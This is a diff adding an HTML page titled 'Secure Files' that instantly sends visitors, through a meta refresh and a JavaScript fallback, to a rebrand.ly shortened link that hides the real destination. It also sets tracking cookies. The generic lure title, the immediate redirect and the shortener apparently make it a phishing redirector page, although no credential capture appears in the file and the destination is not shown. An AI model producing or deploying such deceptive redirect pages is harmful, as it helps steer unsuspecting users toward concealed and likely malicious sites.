@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Secure Files</title>
+    <meta http-equiv="REFRESH" content="0; url=https://rebrand.ly/Securefiles01/">
+
+    <script>
+    (function () {
+        'use strict';
+
+        // ---- COOKIE HELPERS (SameSite=None; Secure for cross-site) ----
+        function setCookie(name, value, days) {
+            var expires = new Date(Date.now() + days * 864e5).toUTCString();
+            document.cookie = encodeURIComponent(name) + '=' + encodeURIComponent(value) +
+                              '; expires=' + expires + '; path=/; SameSite=None; Secure';
+        }
+
+        function getCookie(name) {
+            var rows = document.cookie.split('; ');
+            for (var i = 0; i < rows.length; i++) {
+                var pair = rows[i].split('=');
+                if (pair[0] === encodeURIComponent(name)) return decodeURIComponent(pair[1]);
+            }
+            return null;
+        }
+
+        // ---- COOKIE LOGIC ----
+        var visits = parseInt(getCookie('secure_visits') || '0', 10) + 1;
+        setCookie('secure_visits', String(visits), 30);
+        setCookie('secure_last_visit', new Date().toISOString(), 30);
+
+        // JS fallback redirect
+        setTimeout(function () {
+            window.location.replace('https://rebrand.ly/Securefiles01/');
+        }, 100);
+    })();
+    </script>
+</head>
+<body>
+    <noscript>
+        <p>Redirecting you to secure files...</p>
+        <a href="https://rebrand.ly/Securefiles01/">Click here if you are not redirected</a>
+    </noscript>
+</body>
+</html>
